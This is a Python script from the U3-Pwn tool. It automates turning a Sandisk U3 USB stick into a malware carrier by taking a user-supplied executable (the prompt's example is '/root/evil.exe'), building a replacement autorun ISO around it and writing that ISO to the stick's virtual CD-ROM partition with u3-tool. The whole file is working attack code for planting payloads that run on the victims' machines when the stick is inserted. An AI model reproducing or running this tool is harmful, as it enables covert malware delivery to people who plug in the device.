#!/usr/bin/env python3
# -*- coding: latin-1 -*- ######################################################
#                ____                     _ __                                 #
#     ___  __ __/ / /__ ___ ______ ______(_) /___ __                           #
#    / _ \/ // / / (_-</ -_) __/ // / __/ / __/ // /                           #
#   /_//_/\_,_/_/_/___/\__/\__/\_,_/_/ /_/\__/\_, /                            #
#                                            /___/ team                        #
#                                                                              #
# customexe.py                                                                 #
#                                                                              #
# DATE                                                                         #
# 06/27/2012                                                                   #
#                                                                              #
# DESCRIPTION                                                                  #
# U3-Pwn is a tool designed to automate injecting executables to Sandisk       #
# smart usb devices with default U3 software install. This is performed by     # 
# removing the original iso file from the device and creating a new iso        #
# with autorun features.                                                       #
#                                                                              #
# REQUIREMENTS                                                                  #
# - Metasploit                                                                 #
# - U3-Tool                                                                    #
# - Python-2.6                                                                 #
#                                                                              #
# AUTHOR                                                                       #
# Zy0d0x - http://www.nullsecurity.net/                                        #
#                                                                              #
################################################################################
import subprocess
import pexpect
import time
import os
import sys
import shutil

try:
    import banner
except ImportError as error:
    print('\n[-] Failed To Import banner module\n')
    banner = None
    print(error)

define_path = os.getcwd()
sys.path.append(f'{define_path}/src/')

def safe_banner():
    if banner:
        banner.print_banner()

try:
    safe_banner()
    print(' Detecting Device...\n')

    u3_ids = ['5406', '5408', '5151', '5530', '5535', '550a', '540e']
    vendor_id = '0781:'
    deviceName = None

    for dev_id in u3_ids:
        try:
            device = subprocess.check_output(
                f"lsusb -d {vendor_id}{dev_id}",
                shell=True,
                stderr=subprocess.DEVNULL
            )
            print(' Device Found:', device.decode().strip())
        except subprocess.CalledProcessError:
            continue

    time.sleep(2)
    safe_banner()
    print(' Detecting Partitions...')
    time.sleep(2)

    with open("/proc/partitions") as f:
        lines = f.readlines()[2:]

    for line in lines:
        words = [x.strip() for x in line.split()]
        if len(words) < 4:
            continue
        minorNumber = int(words[1])
        dev = words[3]
        if minorNumber % 16 == 0:
            path = f"/sys/class/block/{dev}"
            if os.path.islink(path) and "/usb" in os.path.realpath(path):
                if dev.startswith("sd"):
                    deviceName = dev
                    print(f"\n Partition Found: /dev/{dev}1")
                    time.sleep(2)
                    break

except Exception as error:
    print('[-] Error during device detection')
    print(error)
    time.sleep(2)
    sys.exit(1)

# ========= Payload Injection =========

try:
    payload = input('\n Please enter filepath & executable name (example: /root/evil.exe): ').strip()

    if not payload.endswith('.exe') or not os.path.isfile(payload):
        print("[-] Invalid file. Must be a valid path to an `.exe` file.")
        sys.exit(1)

    # Prepare payload
    shutil.copy(payload, 'resource/LaunchU3.exe')
    with open('resource/LaunchU3.bat', 'w') as f:
        f.write('LaunchU3.exe')

    # Create ISO
    subprocess.run(
        'genisoimage -volid "U3 System" -o resource/U3\\ System.iso resource/',
        shell=True,
        check=True
    )

    safe_banner()

    if deviceName.startswith("sda") or not deviceName:
        print('[-] No USB target device found or refusing to touch /dev/sda')
        time.sleep(2)
        sys.exit(1)

    print(f'\nCreating a new partition of 8058880 bytes on /dev/{deviceName}\n')
    child1 = pexpect.spawn(f'u3-tool -v -p 8058880 /dev/{deviceName}')
    child1.expect('[yn]')
    child1.sendline('y')
    child1.wait()
    print(f'\nPartitioning completed on /dev/{deviceName}')

    safe_banner()
    print(f'\nInserting new ISO to virtual ROM partition on /dev/{deviceName}\n')
    subprocess.run(
        f'u3-tool -v -l resource/U3\\ System.iso /dev/{deviceName}',
        shell=True,
        check=True
    )
    print(f'\n[+] Custom EXE successfully injected into /dev/{deviceName}\n')
    time.sleep(2)

except Exception as error:
    print('[-] Something went wrong during payload injection')
    print(error)
    time.sleep(2)
    sys.exit(1)

# ========= Cleanup =========

try:
    os.remove('resource/LaunchU3.exe')
    os.remove('resource/LaunchU3.bat')
    os.remove('resource/U3 System.iso')
    shutil.copy('backup/LaunchU3.exe', 'resource/LaunchU3.exe')
except Exception as error:
    print('[-] Cleanup failed')
    print(error)
    time.sleep(2)
    sys.exit(1)
